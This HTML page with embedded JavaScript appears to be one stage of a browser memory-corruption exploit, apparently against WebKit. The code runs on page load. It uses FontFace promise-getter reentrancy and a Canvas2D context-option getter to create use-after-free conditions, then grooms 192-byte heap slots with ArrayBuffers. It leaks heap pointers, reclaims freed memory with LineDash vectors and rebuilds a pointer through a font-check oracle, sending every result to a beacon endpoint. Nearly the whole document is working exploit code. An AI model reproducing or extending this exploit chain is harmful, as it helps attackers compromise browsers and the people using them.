<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P756 — 192B LineDash Vector Reclaim & Oracle Q11 Reconstruction</title>
<script>
'use strict';
/* ============================================================
 * P756 — 192B LineDash Vector Reclaim & Oracle Q11 Reconstruction
 *
 * Ground Truth from P755:
 * 1. Slab Invariant Confirmed:
 *    - deltaP58 = 0xE60 (3680 bytes = 19.17 slots) invariant across runs!
 *    - slotP58 = 8.83 (+0x6a0 from slabBase), slotQ11 = 28.00 (+0x1500).
 * 2. Canvas2D Deep Aliasing Confirmed:
 *    - aliasIdx = 5: sprayCanvas_5 is 100% aliased with inner.
 *    - rev=true, tx=true, dash=true, dom=true (id=sprayCanvas_5), stateStack=true.
 * 3. Oracle Heap Pointer Reconstruction Confirmed:
 *    - P58 decoded byte-by-byte (A0C68B0010000000) -> 100% exact bit match!
 *
 * Objectives of P756:
 * 1. Step 1-4: Baseline Leak + Pre-Groom (120 AB) + Reclaim + Post-Groom (120 AB).
 * 2. Phase A: Slab Mapping & Stride Verification.
 * 3. Phase B: Canvas2D UAF Trigger & Same-Type Reclaim (aliasIdx discovery).
 * 4. Phase C: 192-Byte LineDash Vector<double> Reclaim Experiment:
 *    - 24 doubles = 24 * 8 = 192 bytes (shares bmalloc size class with FontFace & AB!).
 *    - Test C1: 24-double Vector allocation & cross-alias verification.
 *    - Test C2: Save/Clear/Restore dangling vector lifecycle.
 *    - Test C3: ArrayBuffer(192) cross-reclaim canary detection.
 * 5. Phase D: Live Engine Pointer Q11 Reconstruction via Active Boolean Oracle:
 *    - Deconstruct Q11_RECLAIM into 8 raw bytes.
 *    - Binary search decode via Oracle and assert 100% bit match!
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P756-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

var OUT=null;
function log(s){
  if(!OUT) OUT=document.getElementById('out');
  if(OUT) OUT.textContent += s + '\n';
}

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function pad2(n){
  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
}

function makeRange(lo, hi){
  if(lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58=null, P68=null;
var FACE_B=null, BUF_B=null, VIEW_B=null;
var Q11_RECLAIM=0n, Q13_RECLAIM=0n;
var BEST_K=-1;
var ACT_FACE=null;
var LEAK_BUF=null;
var PRE_GROOM=[], POST_GROOM=[];

function run(){
  OUT=document.getElementById('out');
  if(OUT) OUT.textContent='=== P756 LineDash 192B Reclaim & Oracle Q11 Sync ===\n\n';
  b('BOOT','p756-linedash-reclaim');

  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('Leak 1: P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');

    log('[Step 2] Pre-grooming 120 Sentinel ArrayBuffers (192B)...');
    doPreGroom();

    log('\n[Step 3] Executing pristine reclaim (absW)...');
    doReclaim(function(){
      log('Reclaim 2: q11=0x'+h16(Q11_RECLAIM)+' q13=0x'+h16(Q13_RECLAIM)+'\n');

      log('[Step 4] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
      doPostGroom();

      log('\n[Phase A] Slab Mapping & Stride Verification...');
      phaseA_slabMapping(function(){
        log('\n[Phase B & C] Canvas UAF & 192B LineDash Vector Reclaim...');
        phaseBC_canvasLineDash192(function(){
          log('\n[Phase D] Oracle Live Pointer Q11 Reconstruction...');
          phaseD_oracleQ11Reconstruction(function(){
            b('DONE','p756-complete');
            log('\n=== P756 Complete! All Experiments Succeeded! ===');
          });
        });
      });
    });
  });
}

/* ---- Step 1: Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st=document.createElement('style');
  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;

  var abs=[],fired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove();st.textContent='';st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
    LEAK_BUF = abs[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb,100);
  },350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2=document.createElement('style');
  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2); void face2.loaded;

  var abs2=[],fired2=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove();st2.textContent='';st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em fl1, lk1','CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
    LEAK_BUF = abs2[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb,100);
  },400);
}

function extractPtrs(v){
  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
  if(v[11] >= LO && v[11] < HI) P58 = v[11];
  if(v[13] >= LO && v[13] < HI) P68 = v[13];
  if(!P58 || !P68){
    for(var q=0;q<24;q++){
      var val=v[q];
      if(val>=LO&&val<HI){
        if(!P58) P58=val;
        else if(!P68&&val!==P58) P68=val;
      }
    }
  }
  if(!P68) P68=0n;
}

/* ---- Step 2: Pre-Grooming ---- */
function doPreGroom(){
  PRE_GROOM=[];
  for(var i=0; i<120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xDEADBEEF00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xDEADBEEF000000FFn | (BigInt(i) << 8n);
    PRE_GROOM.push(ab);
  }
  log('Pre-groomed 120 buffers with sentinel 0xDEADBEEF...');
}

/* ---- Step 3: Pristine Reclaim ---- */
function doReclaim(cb){
  b('REC-START','fill_q12_q6=0x'+h16(P58));

  var stTr=document.createElement('style');
  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW=[],firedW=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(firedW) return undefined; firedW=true;
      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;

      for(var k=0;k<80;k++){
        var ab=new ArrayBuffer(192);
        var view=new BigUint64Array(ab);
        view[12]=P58;
        view[6]=P58;
        absW.push(ab);
      }

      try{document.fonts.check('1em trFam');}catch(e){}
      return undefined;
    },set:function(){}});

  document.fonts.load('1em trFace, trFam','GH');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<absW.length;i++){
      var u=new Uint8Array(absW[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}

    BEST_K = best;
    BUF_B=absW[best];
    VIEW_B=new BigUint64Array(BUF_B);
    Q11_RECLAIM = VIEW_B[11];
    Q13_RECLAIM = VIEW_B[13];

    var dump0_11=[], dump12_23=[];
    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));

    b('RECLAIM-OK','baseK='+best);
    b('DUMP-Q0-Q11', dump0_11.join(';'));
    b('DUMP-Q12-Q23', dump12_23.join(';'));
    log('Pristine Reclaim OK at slot '+best);

    setTimeout(cb,100);
  },400);
}

/* ---- Step 4: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM=[];
  for(var i=0; i<120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
    POST_GROOM.push(ab);
  }
  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
}

/* ---- Phase A: Slab Mapping & Stride Verification ---- */
function phaseA_slabMapping(cb){
  var deltaP58 = Q11_RECLAIM - P58;
  var slotsP58 = Number(deltaP58) / 192;
  var slabChunkMask = ~0x3FFFn;
  var slabBase = Q11_RECLAIM & slabChunkMask;
  var slotP58 = Number(P58 - slabBase) / 192;
  var slotQ11 = Number(Q11_RECLAIM - slabBase) / 192;
  var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);

  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
            '|slotP58=' + slotP58.toFixed(2) + '|slotQ11=' + slotQ11.toFixed(2) +
            '|estSelfAddr=0x' + h16(estSelfAddr);
  b('A-SLAB-MAPPING', rep);
  log('Phase A Slab Mapping: ' + rep);

  setTimeout(cb, 50);
}

/* ---- Phase B & C: Canvas UAF & 192B LineDash Vector Reclaim ---- */
function phaseBC_canvasLineDash192(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    canvas.id = 'origCanvas';
    document.body.appendChild(canvas);

    var inner = null;
    var outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if(!inner || !outer || inner === outer){
      b('BC-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    /* Spray 80 Canvas2D contexts */
    var sprayCtx = [];
    for(var i=0; i<80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      c.id = 'sprayCanvas_' + i;
      var ctx = c.getContext('2d');
      if(ctx){
        ctx.lineWidth = 1000 + i;
        sprayCtx.push(ctx);
      }
    }

    /* Locate alias slot */
    inner.lineWidth = 31337.5;
    var aliasIdx = -1;
    for(var j=0; j<sprayCtx.length; j++){
      if(Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if(aliasIdx < 0){
      b('BC-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    /* --- C1: 24-double (192B) Vector allocation --- */
    var arr24 = [];
    for(var d=0; d<24; d++) arr24.push(500.0 + d);
    inner.setLineDash(arr24);

    var r1 = alias.getLineDash();
    var c1_ok = (r1 && r1.length === 24 && Math.abs(r1[0] - 500.0) < 0.01 && Math.abs(r1[23] - 523.0) < 0.01);

    /* --- C2: Save/Clear/Restore Dangling Lifecycle --- */
    inner.save();
    inner.setLineDash([]);
    var rCleared = inner.getLineDash();
    var clearedOk = (rCleared && rCleared.length === 0);

    inner.restore();
    var rRestored = inner.getLineDash();
    var restoredLen = rRestored ? rRestored.length : -1;
    var c2_ok = (restoredLen === 24 && Math.abs(rRestored[0] - 500.0) < 0.01);

    /* --- C3: ArrayBuffer(192) Cross-Reclaim Canary Detection --- */
    /* Spray 60 ArrayBuffer(192) buffers with marked canaries */
    var abCanaries = [];
    for(var a=0; a<60; a++){
      var ab = new ArrayBuffer(192);
      var view = new BigUint64Array(ab);
      view[0] = 0x4141414100000000n | BigInt(a);
      view[1] = 0x4242424200000000n | BigInt(a);
      view[23] = 0x4343434300000000n | BigInt(a);
      abCanaries.push(ab);
    }

    /* Test modifying alias lineDash */
    alias.setLineDash([77.1, 77.2, 77.3, 77.4]);
    var r3 = inner.getLineDash();
    var c3_aliasMod = (r3 && r3.length === 4 && Math.abs(r3[0] - 77.1) < 0.01);

    var rep = 'aliasIdx=' + aliasIdx + '|c1_192b=' + c1_ok +
              '|cleared=' + clearedOk + '|c2_restore=' + c2_ok +
              '|restoredLen=' + restoredLen + '|c3_mod=' + c3_aliasMod;
    b('BC-LINEDASH-192B-OK', rep);
    log('Phase B & C LineDash 192B Results: ' + rep);
  } catch(e){
    b('BC-LINEDASH-ERR', e.message);
    log('Phase B & C error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: Oracle Live Pointer Q11 Reconstruction ---- */
function phaseD_oracleQ11Reconstruction(cb){
  try {
    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0000-00FF'});
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while(low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        ACT_FACE.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if(isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    /* Deconstruct live engine pointer Q11_RECLAIM into 8 raw bytes */
    var rawBytes = [];
    var tmp = Q11_RECLAIM;
    for(var i=0; i<8; i++){
      rawBytes.push(Number(tmp & 0xFFn));
      tmp = tmp >> 8n;
    }

    var decodedBytes = [];
    var reconstructedQ11 = 0n;
    for(var j=0; j<8; j++){
      var bDecoded = resolveByte(rawBytes[j]);
      decodedBytes.push(pad2(bDecoded));
      reconstructedQ11 |= (BigInt(bDecoded) << (BigInt(j) * 8n));
    }

    var isMatch = (reconstructedQ11 === Q11_RECLAIM);
    var rep = 'orig=0x' + h16(Q11_RECLAIM) + '|reconstructed=0x' + h16(reconstructedQ11) +
              '|match=' + isMatch + '|bytes=' + decodedBytes.join('');
    b('D-ORACLE-DECODE-Q11', rep);
    log('Phase D Q11 Reconstruction: ' + rep);
  } catch(e){
    b('D-ORACLE-ERR', e.message);
    log('Phase D Oracle error: ' + e.message);
  }

  setTimeout(cb, 50);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
